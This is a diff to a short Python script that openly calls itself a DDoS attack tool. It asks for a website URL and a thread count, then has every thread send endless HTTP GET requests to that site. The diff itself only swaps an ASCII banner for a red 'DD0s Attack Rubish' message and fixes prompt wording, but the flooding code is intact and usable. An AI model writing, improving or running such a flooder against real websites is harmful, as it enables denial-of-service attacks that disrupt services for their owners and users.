@@ -1,17 +1,11 @@
 import requests
 import threading
 
-# Define a banner message
-BANNER = """\033[1;32m
-█▀▄ █▀▄ █▀█ █▀   ▄▄ █▀█ █░█ █▄▄ █ █▀ █░█
-█▄▀ █▄▀ █▄█ ▄█   ░░ █▀▄ █▄█ █▄█ █ ▄█ █▀█
-\033[0m"""
-
 def send_request(url):
     try:
         while True:
             response = requests.get(url)
-            print(BANNER)
+            print("\033[1;31mDD0s Attack Rubish")
     except:
         pass
 
@@ -27,6 +21,6 @@ def start_ddos(url, num_threads):
 
 if __name__ == "__main__":
     website_url = input("Enter the website URL: ")
-    num_threads = int(input("Enter the number of threads you want to send to the website: "))
+    num_threads = int(input("Enter the number of thread you want to send to the website: "))
 
     start_ddos(website_url, num_threads)
